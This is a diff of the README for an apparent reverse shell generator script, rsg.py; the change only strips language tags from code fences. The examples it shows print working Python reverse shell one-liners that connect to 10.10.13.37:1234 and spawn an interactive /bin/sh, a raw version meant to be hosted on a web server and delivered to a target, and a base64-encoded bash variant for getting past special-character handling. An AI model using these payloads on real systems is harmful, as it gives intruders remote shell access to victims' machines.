@@ -28,14 +28,14 @@ optional arguments:
 ## Examples
 
 Generate a __Pyhon__ Reverse Shell __one-liner__.
-```sh
+```
 user@host:~$ ./rsg.py python 10.10.13.37 1234
 [SHELL][PYTHON][ONE-LINER]
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.37",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 Generate a __Python__ Reverse Shell and print it as __raw code__. This is useful if you want to output the result to a script a file and then __host it on a web server__ to deliver it to the target.
-```python
+```
 user@host:~$ ./rsg.py python 10.10.13.37 1234 --raw
 [PYTHON][RAW]
 import socket,subprocess,os;
@@ -48,7 +48,7 @@ p=subprocess.call(["/bin/sh","-i"]);
 ```
 
 Generate a __Python__ Reverse Shell and print it as an __encoded command__. This is useful to __avoid special characters__.
-```sh
+```
 user@host:~$ ./rsg.py python 10.10.13.37 1234 --encode
 [SHELL][PYTHON][ENCODED]
 bash -c "{echo,cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTMuMzciLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=}|{base64,-d}|{bash,-i}"
